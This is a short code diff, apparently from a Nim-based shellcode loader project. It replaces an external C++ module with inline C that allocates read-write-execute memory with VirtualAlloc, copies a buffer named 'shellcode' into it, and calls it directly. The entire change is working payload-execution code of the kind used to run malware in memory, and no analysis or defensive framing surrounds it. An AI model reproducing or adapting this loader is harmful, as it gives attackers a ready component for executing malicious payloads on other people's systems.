@@ -1,6 +1,15 @@
 import public
 
-{.compile: "module\\Direct_Load.cpp".}
-proc Direct_LoadNim(plainBuffer:cstring,size:cint):cint {.importcpp:"Direct_Load(@)",header:"module\\public.hpp".}
+{.emit: """
+int Direct_Load(char *shellcode,SIZE_T shellcodeSize)
+{
+  LPVOID Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy(Memory, shellcode, shellcodeSize);
+	((void(*)())Memory)();
+	return 0;
+}
+""".}
 
-discard Direct_LoadNim(code,codelen)
+proc Direct_Load(plainBuffer:cstring,size:cint):cint {.importcpp:"Direct_Load(@)",nodecl.}
+
+discard Direct_Load(code,codelen)
